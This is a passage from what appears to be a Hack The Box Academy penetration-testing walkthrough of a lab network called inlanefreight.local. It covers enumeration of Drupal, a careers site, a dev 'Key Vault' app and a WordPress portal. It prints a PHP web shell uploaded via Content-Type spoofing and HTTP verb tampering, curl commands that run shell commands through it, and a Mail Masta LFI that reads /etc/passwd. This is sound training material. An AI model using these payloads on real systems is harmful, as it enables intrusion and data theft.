<p>First up is the <code>blog.inlanefreight.local</code> subdomain. At first glance, it looks promising. The site seems to be a forgotten Drupal install or perhaps a test site that was set up and never hardened. We can consult the <a href="https://academy.hackthebox.com/module/113/section/1089">Drupal - Discovery &amp; Enumeration</a> of the <code>Attacking Common Applications</code> module for ideas.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/drupal.png" alt="text"></p>
<p>Using <code>cURL</code>, we can see that Drupal 9 is in use.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep Drupal

<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Generator"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"Drupal 9 (https://www.drupal.org)"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Powered by <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://www.drupal.org"</span>&gt;</span>Drupal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
</code></pre>
<p>A quick Google search shows us that the current stable Drupal version intended for production is <a href="https://www.drupal.org/project/drupal/releases">release 9.4</a>, so we probably will have to get lucky and find some sort of misconfiguration such as a weak admin password to abuse built-in functionality or a vulnerable plugin. Well-known vulnerabilities such as <code>Drupalgeddon 1-3</code> do not affect version 9.x of Drupal, so that&#39;s a dead-end. Trying to log in with a few weak password combinations such as <code>admin:admin</code>, <code>admin:Welcome1</code>, etc., do not bear fruit. Attempting to register a user also fails, so we move on to the next application.</p>
<p>We could note in our report that this Drupal instance looks like it&#39;s not in use and could be worth taking down to further reduce the overall external attack surface.</p>
<hr>
<h3 id="careers-inlanefreight-local">careers.inlanefreight.local</h3>
<p>Next up is the careers subdomain. These types of sites often allow a user to register an account, upload a CV, and potentially a profile picture. This could be an interesting avenue of attack. Browsing first to the login page <code>http://careers.inlanefreight.local/login</code>, we can try some common authentication bypasses and try fuzzing the login form to try to bypass authentication or provoke some sort of error message or time delay that would be indicative of a SQL injection. As always, we test a few weak password combinations such as <code>admin:admin</code>. We should also always test login forms (and forgot password forms if they exist) for username enumeration, but none is apparent in this case.</p>
<p>The <code>http://careers.inlanefreight.local/apply</code> page allows us to apply for a job and upload a CV. Testing this functionality shows that it allows any file type to upload, but the HTTP response does not show where the file is located after upload. Directory brute-forcing does not yield any interesting directories such as <code>/files</code> or <code>/uploads</code> that could house a web shell if we can successfully upload a malicious file.</p>
<p>It&#39;s always a good idea to test user registration functionality on any web applications we come across, as these can lead to all sorts of issues. In the HTB box <a href="https://0xdf.gitlab.io/2021/02/27/htb-academy.html">Academy</a>, it is possible to register on a web application and modify our role to that of an admin at registration time. This was inspired by an actual External Penetration Test finding where I was able to register on an internet-facing web application for as many as five different user roles. Once logged into that application, all sorts of IDOR vulnerabilities existed, resulting in broken authorization on many pages.</p>
<p>Let&#39;s go ahead and register an account at <code>http://careers.inlanefreight.local/register</code> and look around. We register an account with bogus details: <code>test@test.com</code> and the credentials <code>pentester:Str0ngP@ssw0rd!</code>. Sometimes we&#39;ll need to use an actual email address to receive an activation link. We can use a disposable email service such as <a href="https://10minutemail.com/">10 Minute Mail</a> not to clutter up our inbox or keep a dummy account with ProtonMail mail or similar just for testing purposes. You&#39;ll be happy you didn&#39;t use your actual email address the first time Burp Suite Active Scanner hits a form and sends you 1,000+ emails in rapid succession. Register with decently strong credentials, too. You don&#39;t want to introduce a security issue into the web application you&#39;re tasked with testing by registering with credentials such as <code>test:test</code> that could potentially be left on the application long after the test is over (though we should, of course, list in an appendix of our report any modifications made during testing, even registering on a public-facing website).</p>
<p>Once registered, we can log in and browse around. We&#39;re greeted with our profile page at <code>http://careers.inlanefreight.local/profile?id=9</code>. Attempting to fuzz the <code>id</code> parameter for SQLi, command injection, file inclusion, XSS, etc., does not prove fruitful. The ID number itself is interesting. Tweaking this number shows us that we can access other users&#39; profiles and see what jobs they applied to. This is a classic example of an <code>Insecure Direct Object Reference (IDOR)</code> vulnerability and would definitely be worth reporting due to the potential for sensitive data exposure.</p>
<p>After exhausting all options here, we walk away with one decent reportable vulnerability to add to our findings list and move on to the next web application. We can use any directory brute-forcing tool here, but we&#39;ll go with <a href="https://github.com/OJ/gobuster">Gobuster</a>.</p>
<hr>
<h3 id="dev-inlanefreight-local">dev.inlanefreight.local</h3>
<p>The web application at <code>http://dev.inlanefreight.local</code> is simple yet catches the eye. Anything with <code>dev</code> in the URL or name is interesting, as this could potentially be accidentally exposed and riddled with flaws/not production-ready. The application presents a simple login form titled <code>Key Vault</code>. This looks like a homegrown password manager or similar and could lead to considerable data exposure if we can get in. Weak password combinations and authentication bypass payloads don&#39;t get us anywhere, so let&#39;s go back to the basics and look for other pages and directories. Let&#39;s try first with the <code>common.txt</code> wordlist using <code>.php</code> file extensions for the first run.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ gobuster dir -u http:/</span><span class="hljs-regexp">/dev.inlanefreight.local -w /</span>usr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>common.txt -x .php -t <span class="hljs-number">300</span>

===============================================================
Gobuster v3<span class="hljs-number">.1</span><span class="hljs-number">.0</span>
by OJ Reeves (<span class="hljs-meta">@TheColonial</span>) &amp; Christian Mehlmauer (<span class="hljs-meta">@firefart</span>)
===============================================================
[+] <span class="hljs-string">Url:</span>                     <span class="hljs-string">http:</span><span class="hljs-comment">//dev.inlanefreight.local</span>
[+] <span class="hljs-string">Method:</span>                  GET
[+] <span class="hljs-string">Threads:</span>                 <span class="hljs-number">300</span>
[+] <span class="hljs-string">Wordlist:</span>                <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/common.txt
[+] Negative Status <span class="hljs-string">codes:</span>   <span class="hljs-number">404</span>
[+] User <span class="hljs-string">Agent:</span>              gobuster/<span class="hljs-number">3.1</span><span class="hljs-number">.0</span>
[+] <span class="hljs-string">Extensions:</span>              php
[+] <span class="hljs-string">Timeout:</span>                 <span class="hljs-number">10</span>s
===============================================================
<span class="hljs-number">2022</span><span class="hljs-regexp">/06/</span><span class="hljs-number">20</span> <span class="hljs-number">22</span>:<span class="hljs-number">04</span>:<span class="hljs-number">48</span> Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode
===============================================================
/.htaccess            (<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">288</span>]
/.htpasswd            (<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">288</span>]
/.hta                 (<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">288</span>]
/.htpasswd.php        (<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">288</span>]
/.hta.php             (<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">288</span>]
<span class="hljs-regexp">/css                  (Status: 301) [Size: 332] [--&gt; http:/</span><span class="hljs-regexp">/dev.inlanefreight.local/</span>css/]
<span class="hljs-regexp">/images               (Status: 301) [Size: 335] [--&gt; http:/</span><span class="hljs-regexp">/dev.inlanefreight.local/</span>images/]
/index.php            (<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">2048</span>]                                            
/index.php            (<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">2048</span>]                                            
<span class="hljs-regexp">/js                   (Status: 301) [Size: 331] [--&gt; http:/</span><span class="hljs-regexp">/dev.inlanefreight.local/</span>js/]    
/server-status        (<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">288</span>]                                             
<span class="hljs-regexp">/uploads              (Status: 301) [Size: 336] [--&gt; http:/</span><span class="hljs-regexp">/dev.inlanefreight.local/</span>uploads/]
/upload.php           (<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">14</span>]                                               
/.htaccess.php        (<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">288</span>]                                              

===============================================================
<span class="hljs-number">2022</span><span class="hljs-regexp">/06/</span><span class="hljs-number">20</span> <span class="hljs-number">22</span>:<span class="hljs-number">05</span>:<span class="hljs-number">02</span> Finished
===============================================================
</code></pre>
<p>We get a few interesting hits. The files with a <code>403</code> forbidden error code typically mean that the files exist, but the webserver doesn&#39;t allow us to browse to them anonymously. The <code>uploads</code> and <code>upload.php</code> pages immediately call our attention. If we&#39;re able to upload a PHP web shell, chances are we can browse right to it in the <code>/uploads</code> directory, which has directory listing enabled. We can note this down as a valid low-risk finding, <code>Directory Listing Enabled</code>, and capture the necessary evidence to make report writing quick and painless. Browsing to <code>/upload.php</code> gives us a <code>403 Forbidden</code> error message and nothing more, which is interesting because the status code is a <code>200 OK</code> success code. Let&#39;s dig into this deeper.</p>
<p>We&#39;ll need Burp Suite here to capture the request and see if we can figure out what&#39;s going on. If we capture the request and send it to Burp Repeater and then re-request the page using the <code>OPTIONS</code> method, we see that various methods are allowed: <code>GET,POST,PUT,TRACK,OPTIONS</code>. Cycling through the various options, each gives us a server error until we try the <code>TRACK</code> method and see that the <code>X-Custom-IP-Authorization:</code> header is set in the HTTP response. We can consult the <a href="https://academy.hackthebox.com/module/134/section/1159">Web Attacks</a> modules on <code>HTTP Verb Tampering</code> for a refresher on this attack type.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/track\_method.png" alt="text"></p>
<p>Playing around a bit with the request and adding the header <code>X-Custom-IP-Authorization: 127.0.0.1</code> to the HTTP request in Burp Repeater and then requesting the page with the <code>TRACK</code> method again yields an interesting result. We see what appears to be a file upload form in the HTTP response body.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/track\_method\_auth.png" alt="text"></p>
<p>If we right-click anywhere in the <code>Response</code> window in <code>Repeater</code> we can select <code>show response in browser</code>, copy the resultant URL and request it in the browser we are using with the Burp proxy. A photo editing platform loads for us.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/pixel\_shop.png" alt="text"></p>
<p>We can click on the <code>Browse</code> button and attempt to upload a simple webshell with the following contents:</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>Save the file as <code>5351bf7271abaa2267e03c9ef6393f13.php</code> or something similar. It&#39;s a good practice to create random file names when uploading a web shell to a public-facing website so a random attacker doesn&#39;t happen upon it. In our case, we&#39;d want to use something password protected or restricted to our IP address since directory listing is enabled, and anyone could browse to the <code>/uploads</code> directory and find it. Attempting to upload the <code>.php</code> file directly results in an error: &quot;<code>JPG, JPEG, PNG &amp; GIF files are allowed.</code>&quot;, which shows that some weak client-side validation is likely in place. We can grab the POST request, send it to Repeater once again and try modifying the <code>Content-Type:</code> header in the request to see if we can trick the application into accepting our file as valid. We&#39;ll try altering the header to <code>Content-Type: image/png</code> to pass off our web shell as a valid PNG image file. It works! We get the following response: <code>File uploaded /uploads/5351bf7271abaa2267e03c9ef6393f13.php</code>.</p>
<p>We can now use <code>cURL</code> to interact with this web shell and execute commands on the web server.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ curl http:<span class="hljs-comment">//dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id</span>

uid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) gid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) groups=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>)
</code></pre>
<p>Checking the host&#39;s IP addressing, it doesn&#39;t appear that we&#39;ve landed inside the Inlanefreight internal network as the IP address is not within the internal network scope. This may just be a standalone web server, so we&#39;ll continue on.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/<span class="hljs-number">5351</span>bf7271abaa2267e03c9ef6393f13.php?<span class="hljs-keyword">cmd</span><span class="bash">=hostname%20-I
</span>
<span class="hljs-number">172.18</span>.<span class="hljs-number">0.3</span>
</code></pre>
<p>From here, we can enumerate the host further, looking for sensitive data, note down another two findings: <code>HTTP Verb Tampering</code> and <code>Unrestricted File Upload</code>, and move on to the next host.</p>
<hr>
<h3 id="ir-inlanefreight-local">ir.inlanefreight.local</h3>
<p>The next target in our list is <code>http://ir.inlanefreight.local</code>, the company&#39;s Investor Relations Portal hosted with WordPress. For this we can consult the <a href="https://academy.hackthebox.com/module/113/section/1100">WordPress - Discovery &amp; Enumeration</a> section of the <code>Attacking Common Applications</code> module. Let&#39;s fire up <code>WPScan</code> and see what we can enumerate using the <code>-ap</code> flag to enumerate all plugins.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo wpscan -e ap -t 500 --url http:/</span>/ir.inlanefreight.local

&lt;SNIP&gt;

[+] WordPress version <span class="hljs-number">6.0</span> identified (Latest, released on <span class="hljs-number">2022</span><span class="hljs-number">-05</span><span class="hljs-number">-24</span>).
 | Found <span class="hljs-string">By:</span> Rss Generator (Passive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span>

[+] WordPress theme <span class="hljs-keyword">in</span> <span class="hljs-string">use:</span> cbusiness-investment
 | <span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/themes/cbusiness-investment/</span>
 | Latest <span class="hljs-string">Version:</span> <span class="hljs-number">0.7</span> (up to date)
 | Last <span class="hljs-string">Updated:</span> <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-25</span><span class="hljs-string">T00:</span><span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z
 | <span class="hljs-string">Readme:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt</span>
 | Style <span class="hljs-string">URL:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0</span>
 | Style <span class="hljs-string">Name:</span> CBusiness Investment
 | Style <span class="hljs-string">URI:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/</span>
 | <span class="hljs-string">Description:</span> CBusiness Investment WordPress theme is used <span class="hljs-keyword">for</span> all type of corporate business. That Multipurpose T...
 | <span class="hljs-string">Author:</span> Themescave
 | Author <span class="hljs-string">URI:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//www.themescave.com/</span>
 |
 | Found <span class="hljs-string">By:</span> Css Style In Homepage (Passive Detection)
 | Confirmed <span class="hljs-string">By:</span> Css Style In <span class="hljs-number">404</span> Page (Passive Detection)
 |
 | <span class="hljs-string">Version:</span> <span class="hljs-number">0.7</span> (<span class="hljs-number">80</span>% confidence)
 | Found <span class="hljs-string">By:</span> Style (Passive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'</span>

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) <span class="hljs-string">Identified:</span>

[+] b2i-investor-tools
 | <span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/</span>
 | Latest <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.5</span> (up to date)
 | Last <span class="hljs-string">Updated:</span> <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-17</span><span class="hljs-string">T15:</span><span class="hljs-number">21</span>:<span class="hljs-number">00.000</span>Z
 |
 | Found <span class="hljs-string">By:</span> Urls In Homepage (Passive Detection)
 | Confirmed <span class="hljs-string">By:</span> Urls In <span class="hljs-number">404</span> Page (Passive Detection)
 |
 | <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.5</span> (<span class="hljs-number">100</span>% confidence)
 | Found <span class="hljs-string">By:</span> Query Parameter (Passive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5</span>
 | Confirmed <span class="hljs-string">By:</span> Readme - Stable Tag (Aggressive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt</span>

[+] mail-masta
 | <span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/mail-masta/</span>
 | Latest <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span> (up to date)
 | Last <span class="hljs-string">Updated:</span> <span class="hljs-number">2014</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T07:</span><span class="hljs-number">52</span>:<span class="hljs-number">00.000</span>Z
 |
 | Found <span class="hljs-string">By:</span> Urls In Homepage (Passive Detection)
 | Confirmed <span class="hljs-string">By:</span> Urls In <span class="hljs-number">404</span> Page (Passive Detection)
 |
 | <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span> (<span class="hljs-number">80</span>% confidence)
 | Found <span class="hljs-string">By:</span> Readme - Stable Tag (Aggressive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt</span>

[!] No WPScan API Token given, <span class="hljs-keyword">as</span> a result vulnerability data has not been output.
[!] You can get a free API token with <span class="hljs-number">25</span> daily requests by registering at <span class="hljs-string">https:</span><span class="hljs-comment">//wpscan.com/register</span>

[+] <span class="hljs-string">Finished:</span> Mon Jun <span class="hljs-number">20</span> <span class="hljs-number">23</span>:<span class="hljs-number">07</span>:<span class="hljs-number">09</span> <span class="hljs-number">2022</span>
[+] Requests <span class="hljs-string">Done:</span> <span class="hljs-number">35</span>
[+] Cached <span class="hljs-string">Requests:</span> <span class="hljs-number">7</span>
[+] Data <span class="hljs-string">Sent:</span> <span class="hljs-number">9.187</span> KB
[+] Data <span class="hljs-string">Received:</span> <span class="hljs-number">164.854</span> KB
[+] Memory <span class="hljs-string">used:</span> <span class="hljs-number">224.816</span> M
</code></pre>
<p>From the scan, we can deduce the following bits of information:</p>
<ul>
<li>The WordPress core version is the latest (6.0 at the time of writing)</li>
<li>The theme in use is <code>cbusiness-investment</code></li>
<li>The <code>b2i-investor-tools</code> plugin is installed</li>
<li>The <code>mail-masta</code> plugin is installed</li>
</ul>
<p>The <code>Mail Masta</code> plugin is an older plugin with several known vulnerabilities. We can use <a href="https://www.exploit-db.com/exploits/50226">this</a> exploit to read files on the underlying file system by leveraging a Local File Inclusion (LFI) vulnerability.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/ir.inlanefreight.local/wp</span>-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=<span class="hljs-regexp">/etc/passwd</span>

<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
</code></pre>
<p>We can add another finding to our list: <code>Local File Inclusion (LFI)</code>. Next, let&#39;s move on and see if we can enumerate WordPress users using <code>WPScan</code>.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ wpscan -e u -t 500 --url http:/</span>/ir.inlanefreight.local

&lt;SNIP&gt;

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - <span class="hljs-string">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span> &lt;===================================&gt; (<span class="hljs-number">10</span> / <span class="hljs-number">10</span>) <span class="hljs-number">100.00</span>% <span class="hljs-string">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>

[i] User(s) <span class="hljs-string">Identified:</span>

[+] ilfreightwp
 | Found <span class="hljs-string">By:</span> Rss Generator (Passive Detection)
 | Confirmed <span class="hljs-string">By:</span>
 |  Wp Json Api (Aggressive Detection)
 |   - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&amp;page=1</span>
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - <span class="hljs-string">http:</span><span class="hljs-comment">//ir.inlanefreight.local/wp-sitemap-users-1.xml</span>
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found <span class="hljs-string">By:</span> Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed <span class="hljs-string">By:</span> Login Error Messages (Aggressive Detection)

[+] james
 | Found <span class="hljs-string">By:</span> Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed <span class="hljs-string">By:</span> Login Error Messages (Aggressive Detection)

[+] john
 | Found <span class="hljs-string">By:</span> Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed <span class="hljs-string">By:</span> Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, <span class="hljs-keyword">as</span> a result vulnerability data has not been output.
[!] You can get a free API token with <span class="hljs-number">25</span> daily requests by registering at <span class="hljs-string">https:</span><span class="hljs-comment">//wpscan.com/register</span>

[+] <span class="hljs-string">Finished:</span> Mon Jun <span class="hljs-number">20</span> <span class="hljs-number">23</span>:<span class="hljs-number">14</span>:<span class="hljs-number">33</span> <span class="hljs-number">2022</span>
[+] Requests <span class="hljs-string">Done:</span> <span class="hljs-number">28</span>
[+] Cached <span class="hljs-string">Requests:</span> <span class="hljs-number">37</span>
[+] Data <span class="hljs-string">Sent:</span> <span class="hljs-number">8.495</span> KB
[+] Data <span class="hljs-string">Received:</span> <span class="hljs-number">269.719</span> KB
[+] Memory <span class="hljs-string">used:</span> <span class="hljs-number">176.859</span> MB
[+] Elapsed <span class="hljs-string">time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">0</span>
</code></pre>
<p>We find several users:</p>
<ul>
<li>ilfreightwp</li>
<li>tom</li>
<li>james</li>
<li>john</li>
</ul>
